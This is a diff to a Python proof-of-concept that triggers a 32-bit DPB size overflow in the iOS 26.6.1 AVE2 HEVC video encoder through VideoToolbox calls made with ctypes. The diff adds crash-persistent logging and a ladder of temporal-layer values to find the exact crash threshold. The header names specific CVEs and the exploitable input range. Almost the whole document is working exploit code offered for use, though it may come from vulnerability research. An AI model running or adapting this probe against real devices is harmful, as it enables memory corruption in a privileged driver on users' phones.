@@ -1,22 +1,40 @@
 """
-AVEVideoEncoder NTL-based DPB overflow PoC — iOS 26.6.1, iPhone 16
-Targets CVE-2026-112466 / CVE-2026-112468..112470 / CVE-2026-112689
+AVE2 NTL overflow PoC — incremental-output version (v2)
+Writes results to AppGroup file so partial output survives a hard crash.
 
-Root cause (revised):
-  26.6.1 computes DPB buffer size as (frame_unit_size × NTL) in 32-bit arithmetic.
-  For 4K HEVC (3840×2160), frame_unit ≈ 2,088,960 bytes.
-  With NTL ≥ 2056: product overflows → under-allocated DPB → OOB write on encode.
+Root cause: 26.6.1 computes DPB buffer size as (DPB_unit × NTL) in 32-bit.
+4K HEVC: DPB_unit ≈ 2,088,960 bytes → overflow at NTL ≥ 2056.
 
-  Exploitable window (26.6.1): NTL in [2056, 16462]
-  - Below 2056:  no DPB overflow
-  - 2056–16462:  DPB 32-bit overflow → OOB write (these 5 CVEs)
-  - 16463+:      linked-list crash (CVE-2026-112705, 27.0.1-only, different path)
-
-  Fix (27.1/26.7.2): 19 new standalone overflow checkers using 64-bit arithmetic.
+Previous run: broad ladder [1..16462], crashed at 151s.
+Crash window: NTL 2056–4096 (15 probes × ~10s/probe).
+This run: targeted binary-search ladder inside that window.
 
 Usage: run via offload_python MCP on iPhone 26.6.1.
+AppGroup UUID: 92767569-346F-4ECE-B7F6-8107C7A21B5B
+Log file: AppGroup/Library/ave2_ntl_probe.txt
 """
-import ctypes as C, sys
+import ctypes as C, sys, os, time
+
+APPGROUP = (
+    "/private/var/mobile/Containers/Shared/AppGroup"
+    "/92767569-346F-4ECE-B7F6-8107C7A21B5B/Library"
+)
+LOG_FILE = f"{APPGROUP}/ave2_ntl_probe.txt"
+
+def log(msg):
+    ts = time.strftime("%H:%M:%S")
+    line = f"[{ts}] {msg}\n"
+    sys.stdout.write(line)
+    sys.stdout.flush()
+    try:
+        with open(LOG_FILE, "a") as f:
+            f.write(line)
+            f.flush()
+            os.fsync(f.fileno())
+    except Exception as exc:
+        sys.stdout.write(f"[LOG_ERR] {exc}\n")
+        sys.stdout.flush()
+
 
 CF = C.CDLL("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
 VT = C.CDLL("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox")
@@ -65,16 +83,17 @@ CALLBACK_TYPE = C.CFUNCTYPE(None, C.c_void_p, C.c_void_p, C.c_int32, C.c_void_p,
 @CALLBACK_TYPE
 def output_cb(*a): pass
 
-WIDTH, HEIGHT = 3840, 2160  # 4K — well within VT limits
+WIDTH, HEIGHT = 3840, 2160  # 4K
+
+CTU_W = (WIDTH + 63) // 64
+CTU_H = (HEIGHT + 63) // 64
+DPB_UNIT = CTU_W * CTU_H * 1024
+OVERFLOW_NTL = (1 << 32) // DPB_UNIT
 
 
 def probe_ntl(ntl):
-    """Test one NTL value. Returns: 'ok', 'rejected', or 'crash'."""
-    # Overflow estimate for this NTL
-    ctu_w = (WIDTH + 63) // 64
-    ctu_h = (HEIGHT + 63) // 64
-    unit = ctu_w * ctu_h * 1024
-    product_64 = unit * ntl
+    """Test one NTL value. Returns: string result."""
+    product_64 = DPB_UNIT * ntl
     product_32 = product_64 & 0xFFFFFFFF
     overflow = product_64 >= (1 << 32)
 
@@ -83,7 +102,7 @@ def probe_ntl(ntl):
         None, WIDTH, HEIGHT, kHEVC, None, None, None, output_cb, None, C.byref(sess)
     )
     if st != 0 or not sess.value:
-        return f"session_create_fail({st:#x})"
+        return f"session_fail({st:#x})"
 
     ntl_key = C.c_void_p.in_dll(VT, "kVTCompressionPropertyKey_NumberOfTemporalLayers").value
     ntl_val = cf_num(ntl)
@@ -93,7 +112,6 @@ def probe_ntl(ntl):
         VT.VTCompressionSessionInvalidate(sess.value)
         return f"ntl_rejected({st2:#x})"
 
-    # Create pixel buffer (4K is fine — ~12 MB)
     pbuf = C.c_void_p(0)
     st3 = CV.CVPixelBufferCreate(
         None, WIDTH, HEIGHT,
@@ -113,20 +131,42 @@ def probe_ntl(ntl):
     CV.CVPixelBufferRelease(pbuf.value)
     VT.VTCompressionSessionInvalidate(sess.value)
 
-    overflow_str = f"OVERFLOW→{product_32:#x}" if overflow else f"no_overflow({product_64:#x})"
-    return f"encode_st={st4:#x} {overflow_str}"
+    ovf_str = f"OVERFLOW→{product_32:#010x}" if overflow else f"no_overflow({product_64:#x})"
+    return f"encode_st={st4:#x} {ovf_str}"
 
 
-print(f"4K HEVC NTL overflow ladder — {WIDTH}x{HEIGHT}")
-print(f"DPB unit estimate: {(WIDTH//64+1) * (HEIGHT//64+1) * 1024} bytes")
-print(f"Overflow threshold: NTL >= {(1<<32) // ((WIDTH//64+1) * (HEIGHT//64+1) * 1024)}")
-sys.stdout.flush()
+# Header
+log(f"=== AVE2 NTL probe v2 — {WIDTH}x{HEIGHT} ===")
+log(f"DPB_unit={DPB_UNIT}  overflow_threshold=NTL>={OVERFLOW_NTL}")
+log(f"Log: {LOG_FILE}")
+log("---")
 
-# Ladder: safe baseline, ramp past overflow threshold
-# Print + flush BEFORE the probe so partial output survives a hard kill
-for ntl in [1, 100, 500, 1000, 2000, 2056, 2100, 2500, 3000, 4096, 8192, 16000, 16462]:
-    print(f"  NTL={ntl:6d}: STARTING", flush=True)
+# Ladder:
+#   First confirm the safe baseline and the first overflow value survive.
+#   Then binary-search 2056–4096 to pin the exact crash NTL.
+#   Write "STARTING" BEFORE the call so the last line in the log tells us
+#   which probe killed the process.
+LADDER = [
+    1,     # sanity: no overflow, should be encode_st=0
+    2000,  # just below threshold: no overflow
+    2056,  # first overflow NTL — may or may not crash depending on trigger
+    2200,
+    2500,
+    3000,
+    3500,
+    4096,
+    # extended range only if we survive 4096:
+    6000,
+    8192,
+    12000,
+    16000,
+    16462,
+]
+
+for ntl in LADDER:
+    # Log STARTING first — if the next line never appears, this NTL killed us
+    log(f"NTL={ntl:6d}: STARTING  (overflow={'YES' if DPB_UNIT*ntl>=(1<<32) else 'NO'})")
     result = probe_ntl(ntl)
-    print(f"  NTL={ntl:6d}: {result}", flush=True)
+    log(f"NTL={ntl:6d}: {result}")
 
-print("\nDONE", flush=True)
+log("=== DONE ===")
